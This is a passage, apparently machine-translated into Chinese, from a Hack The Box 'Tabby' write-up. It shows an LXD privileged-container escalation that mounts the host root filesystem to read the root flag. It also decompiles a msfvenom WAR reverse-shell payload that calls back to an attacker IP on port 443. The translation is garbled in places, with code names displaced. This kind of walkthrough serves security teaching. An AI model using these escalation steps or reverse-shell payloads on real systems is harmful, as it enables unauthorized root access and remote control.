    ash@tabby:/dev/shm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
    ash@tabby:/dev/shm$ ls -l
    total 4
    -rw-rw-r-- 1 ash ash 656 Nov  4 12:40 bob.tar.bz2
    

如果我还没有在上面完成它，我将运行并接受所有默认值进行初始化：`lxd init`

    ash@tabby:/dev/shm$ lxd init
    Would you like to use LXD clustering? (yes/no) [default=no]: 
    Do you want to configure a new storage pool? (yes/no) [default=yes]: 
    Name of the new storage pool [default=default]: 
    Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: 
    Create a new BTRFS pool? (yes/no) [default=yes]: 
    Would you like to use an existing block device? (yes/no) [default=no]: 
    Size in GB of the new loop device (1GB minimum) [default=15GB]: 
    Would you like to connect to a MAAS server? (yes/no) [default=no]: 
    Would you like to create a new local network bridge? (yes/no) [default=yes]: 
    What should the new bridge be called? [default=lxdbr0]: 
    What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
    Would you like LXD to be available over the network? (yes/no) [default=no]: 
    Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
    Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
    

现在，我将导入 imiage，创建它，添加主机文件系统，然后启动映像：

    ash@tabby:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
    ash@tabby:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
    Creating bobVM
    ash@tabby:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
    Device realRoot added to bobVM
    ash@tabby:/dev/shm$ lxc start bobVM
    

在那里取得成功后，我可以得到一个shell并访问根文件系统和标志：

    ash@tabby:/dev/shm$ lxc exec bobVM -- /bin/sh
    # cd /r
    # ls
    bin    dev   lib    libx32      mnt   root  snap      sys  var
    boot   etc   lib32  lost+found  opt   run   srv       tmp
    cdrom  home  lib64  media       proc  sbin  swap.img  usr
    # cd root
    # ls
    root.txt  snap
    # cat root.txt
    09212c70************************
    

## 超越根源 - 什么是战争

我使用生成的文件在 Tabby 上执行。那么，战争到底是怎么回事呢？它实际上只是一个zip存档：`.war``msfvenom`

    root@kali# file rev.10.10.14.18-443.war 
    rev.10.10.14.18-443.war: Zip archive data, at least v2.0 to extract
    

我可以解压缩它：

    root@kali# unzip rev.10.10.14.18-443.war 
    Archive:  rev.10.10.14.18-443.war
       creating: WEB-INF/
      inflating: WEB-INF/web.xml         
       creating: WEB-INF/classes/
       creating: WEB-INF/classes/metasploit/
      inflating: WEB-INF/classes/metasploit/Payload.class  
      inflating: WEB-INF/classes/metasploit/PayloadServlet.class  
    replace WEB-INF/classes/metasploit/Payload.class? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
    new name: WEB-INF/classes/metasploit/Payload2.class
      inflating: WEB-INF/classes/metasploit/Payload2.class  
       creating: WEB-INF/classes/javapayload/
       creating: WEB-INF/classes/javapayload/stage/
      inflating: WEB-INF/classes/javapayload/stage/Stage.class  
      inflating: WEB-INF/classes/javapayload/stage/StreamForwarder.class  
      inflating: WEB-INF/classes/javapayload/stage/Shell.class  
      inflating: WEB-INF/classes/metasploit.dat  
    

我不清楚为什么有两份.我重命名了其中一个并检查了每个的哈希值 - 它们是相同的。`Payload.class`

该文件告诉 WAR 从哪里开始：`web.xml`

    <?xml version="1.0"?>
    <!DOCTYPE web-app PUBLIC
    "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
    "http://java.sun.com/dtd/web-app_2_3.dtd">
    <web-app>
    <servlet>
    <servlet-name>pisrncupolel</servlet-name>
    <servlet-class>metasploit.PayloadServlet</servlet-class>
    </servlet>
    <servlet-mapping>
    <servlet-name>pisrncupolel</servlet-name>
    <url-pattern>/*</url-pattern>
    </servlet-mapping>
    </web-app>
    

`servlet-class`定义了访问 WAR 时运行的内容，在本例中为 。我会在 中找到该文件。我可以用以下命令将其反编译回Java：`metasploit.PayloadServlet``WEB-INF/classes/metasploit/PayloadServlet.class``procyon [path to class file]`

    package metasploit;
    
    import java.io.IOException;
    import javax.servlet.ServletException;
    import java.io.PrintWriter;
    import javax.servlet.http.HttpServletResponse;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServlet;
    
    public class PayloadServlet extends HttpServlet implements Runnable
    {
        public void run() {
            try {
                Payload.main(new String[] { "" });
            }
            catch (Exception ex) {}
        }
        
        protected void doGet(final HttpServletRequest httpServletRequest, final HttpServletResponse httpServletResponse) throws ServletException, IOException {
            final PrintWriter writer = httpServletResponse.getWriter();
            try {
                new Thread(this).start();
            }
            catch (Exception ex) {}
            writer.close();
        }
    }
    

该函数是运行的内容，它调用 。在同一个目录中，有一个，它是反向壳的内脏。在 的开头，它作为资源文件获取：`run``Payload.main``Payload.class``main``/metasploit.dat`

        public static void main(final String[] array) throws Exception {
            final Properties properties = new Properties();
            final Class<Payload> clazz = Payload.class;
            final String string = clazz.getName().replace('.', '/') + ".class";
            final InputStream resourceAsStream = clazz.getResourceAsStream("/metasploit.dat");
    

此文件定义了 、 和 ：`LHOST``LPORT``EmbeddedStage`

    LHOST=10.10.14.18
    LPORT=443
    EmbeddedStage=Shell
    

主函数处理下一阶段的加载。因为我使用未暂存的有效负载构建我的有效负载，所以有效负载本身嵌入到 WAR 中。如果我用 构建另一个，这将是一个分阶段的有效载荷，只带来它需要连接到 Metaploit 并获取下一阶段的存根。在那场战争中，我发现没有：`java/shell_reverse_tcp``java/shell/reverse_tcp``metasploit.dat``EmbeddedStage`

    Spawn=2
    LHOST=10.10.14.18
    LPORT=443
    

此外，没有目录。`javapayload`

回顾未暂存的有效负载，调用中的最后一行传递值。`main``bootstrap``EmbeddedStage`

    new Payload().bootstrap(inputStream, (OutputStream)closeable, properties.getProperty("EmbeddedStage", null), array4);
    

查看 ，有一个 ，它反编译为：`WEB-INF/classes/javapayload/stage/``Shell.class`

    package javapayload.stage;
    
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.io.DataInputStream;
    
    public class Shell implements Stage
    {
        public void start(final DataInputStream dataInputStream, final OutputStream outputStream, final String[] array) throws Exception {
            final String[] cmdarray = { null };
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
                cmdarray[0] = "cmd.exe";
            }
            else {
                cmdarray[0] = "/bin/sh";
            }
            final Process exec = Runtime.getRuntime().exec(cmdarray);
            new StreamForwarder(dataInputStream, exec.getOutputStream(), outputStream).start();
            new StreamForwarder(exec.getInputStream(), outputStream, outputStream).start();
            new StreamForwarder(exec.getErrorStream(), outputStream, outputStream).start();
            exec.waitFor();
            dataInputStream.close();
            outputStream.close();
        }
    }
    

这是一个非常标准的Java反向外壳。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)